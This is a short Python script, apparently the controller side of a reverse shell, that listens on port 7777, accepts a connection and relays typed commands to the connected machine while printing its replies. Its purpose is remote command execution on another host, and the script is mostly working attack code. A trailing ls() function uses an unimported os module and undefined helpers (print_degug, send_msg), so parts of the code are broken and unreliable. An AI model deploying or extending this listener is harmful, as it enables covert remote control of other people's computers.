import socket
import sys

def socket_create():
    try: 
            global host 
            global port
            global sock
            host = ''
            port = 7777
            sock = socket.socket()
    except socket.error as msg:
        print("Socket error: " + str(msg))


def socket_bind():
    try:
            global host
            global port
            global sock
            print("Binding to port: " + str(port))
            sock.bind((host, port))
            sock.listen(5)
    except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
            socket_bind()


def socket_accept():
    conn, address = sock.accept()
    print("Connected! | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = str(input())
        if cmd == 'quit':
            conn.close()
            sock.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024))
            print(client_response)


def  main():
    socket_create()
    socket_bind()
    socket_accept()

def ls():
    msg = os.listdir(os.getcwd())
    msg = "\n".join(msg)
    print_degug(msg)
    send_msg("ls", msg)





main()
